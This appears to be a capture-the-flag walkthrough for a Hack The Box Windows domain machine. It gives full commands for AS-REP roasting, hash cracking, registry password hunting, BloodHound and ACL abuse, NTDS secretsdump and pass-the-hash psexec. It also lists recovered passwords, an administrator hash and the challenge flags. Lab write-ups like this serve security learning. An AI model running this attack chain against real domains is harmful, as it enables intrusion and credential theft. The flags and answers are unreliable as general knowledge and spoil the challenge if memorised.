@@ -1,0 +1,37 @@
+Running the nmap script we get a lot of ports, but the most interesting ones are 80 ( web) 445 ( smb ) and we know that we have AD.
+
+Let's first run the `enum4linux` script to get some intel for this box. We get the domain name `EGOTISTICALBANK`. In addition to this, the null session over smbclient works. 
+If we try to see the shares `smbclient -L \\10.10.10.175 -N` we get an auth error. So maybe that's not the way we should exploit.
+
+Looking on the homepage ( port 80 ) -> Guessing version 
+There is a lot of lorem ipsum text, but on the `about.html` we have some interesting names and a good hint: `only one security manager`. We asume the one of them is a security manager. Because of the experience, we try the username schema `flastname` which is the first letter of the firstname, and the whole lastname. 
+
+Proced to the AD attack
+Because we have kerberos and LDAP installed on the box, it would be a shame not to try the AD attack. 
+I will use the impacket to do this, using the GetNPUsers, as shown `./GetNPUsers.py EGOTISTICALBANK/fsmith -dc-ip 10.10.10.175`
+From here we get the hash, which we must crack, using john `john --wordlist=/usr/share/wordlists/rockyou.txt hash.asrep`
+Now we got the user with its password. 
+
+Getting the user. 
+Connect to the Windows Remote Manager, using the linux version, evil-winrm, as shown `evil-winrm -u fsmith -p Thestrokes23 -i 10.10.10.175` and we got the user. 
+
+Heading to the root. 
+After some basic enum we find something interesting in the windows registry using the `reg query HKLM /f password /t REG_SZ /s` 
+Looking into this we find out that the default password is `Moneymakestheworldgoround!`. Trying our luck we get the new user, svc_loanmgr `evil-winrm -p Moneymakestheworldgoround! -u svc_loanmgr -i 10.10.10.175`
+Upload the bloodhound [ upload SharpHound.ps1 ]
+When we open a session as evil-winrm we get access to the powershell by default, so we need to import the SharpHound script using the `. .\SharpHound.ps1` and than run the methods `Invoke-Bloodhound -CollectionMethod All -Domain EGOTISTICALBANK -LDAPUser svc_loanmgr -LDAPPass Moneymakestheworldgoround!`
+Download the archive using the builtin download method on evil-winrm.
+Run aclpwn to activate the secretsdump, using the following cmd `aclpwn -f SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL -t EGOTISTICAL-BANK.LOCAL -tt domain -du neo4j -dp Nadgob17 -d 10.10.10.175`
+And the last step on this box, get the output of `./secretsdump.py EGOTISTICAL-BANK.LOCAL/svc_loanmgr:"Moneymakestheworldgoround!"@10.10.10.175 -ntds ntds -history -just-dc-ntlm`
+Get the root shell with impacket's psexec, `./psexec.py Administrator@10.10.10.175 -hashes aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff`
+
+Rooted. 
+
+Users:
+-> fsmith:Thestrokes23
+-> Default password: Moneymakestheworldgoround!
+-> svc_loanmgr:Moneymakestheworldgoround!
+
+Flags:
+-> User: 1b5520b98d97cf17f24122a55baf70cf
+-> Root: f3ee04965c68257382e31502cc5e881f
